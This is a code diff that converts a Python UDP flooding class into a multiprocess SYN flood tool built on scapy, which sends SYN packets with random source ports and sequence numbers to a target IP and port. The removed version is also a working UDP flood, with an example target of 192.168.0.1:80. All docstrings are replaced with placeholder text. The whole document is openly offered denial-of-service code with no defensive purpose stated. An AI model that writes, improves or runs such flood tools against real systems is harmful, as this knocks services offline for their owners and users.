@@ -1,81 +1,46 @@
 import multiprocessing
-import socket
-import time
+from scapy.all import send, IP, TCP
+import random
 
-
-class Flood:
+class BlitzSyn:
     """
-    Class to perform a simple flooding attack.
+    There are going to be some comments
     """
-
     def __init__(self, target_ip, target_port):
         """
-        Initialize the Flood class with the target IP and port.
-
-        :param target_ip: IP address of the target.
-        :param target_port: Port of the target.
+        There are going to be some comments
         """
         self.target_ip = target_ip
         self.target_port = target_port
 
-
-    def _send_packet(self):
+    def _send_syn_packet(self):
         """
-        Sends a single packet to the target. 
-        This method is intended to be run by a multiprocessing worker.
+        There are going to be some comments
         """
-        try:
-            # Create a socket
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.settimeout(1)
+        ip_layer = IP(dst=self.target_ip)
+        tcp_layer = TCP(sport=random.randint(1024, 65535), dport=self.target_port, flags='S', seq=random.randint(0, 4294967295))
+        packet = ip_layer / tcp_layer
+        send(packet, verbose=False)
 
-            # Random data to send
-            packet = bytes(1024)  # 1 KB packet of zeros
-            sock.sendto(packet, (self.target_ip, self.target_port))
-        except Exception as e:
-            print(f"Error sending packet: {e}")
-        finally:
-            sock.close()
-
-
-    def attack(self, workers=10, duration=30):
+    def _worker(self, packets):
         """
-        Start the flooding attack.
-
-        :param workers: Number of parallel workers to use.
-        :param duration: Duration of the attack in seconds.
+        There are going to be some comments
         """
-        print(f"Starting attack on {self.target_ip}:{self.target_port} with {workers} workers for {duration} seconds.")
+        for _ in range(packets):
+            self._send_syn_packet()
 
-        # Create a pool of worker processes
-        process_pool = []
+    def attack(self, workers=10, packets_per_worker=100):
+
+        """
+        There are going to be some comments
+        """
+        print(f"Starting SYN flood attack on {self.target_ip}:{self.target_port} with {workers} workers.")
+        processes = []
         for _ in range(workers):
-            process = multiprocessing.Process(target=self._worker, args=(duration,))
-            process_pool.append(process)
+            process = multiprocessing.Process(target=self._worker, args=(packets_per_worker,))
+            processes.append(process)
             process.start()
 
-        # Wait for all processes to complete
-        for process in process_pool:
+        for process in processes:
             process.join()
-
-        print("Attack finished.")
-
-
-    def _worker(self, duration):
-        """
-        Worker function to continuously send packets for the specified duration.
-        """
-        end_time = time.time() + duration
-        while time.time() < end_time:
-            self._send_packet()
-
-
-# Example usage
-if __name__ == "__main__":
-    # Replace with actual target IP and port
-    target_ip = "192.168.0.1"
-    target_port = 80
-
-
-    flooder = Flood(target_ip, target_port)
-    flooder.attack(workers=5, duration=10)
+        print("SYN flood attack completed.")
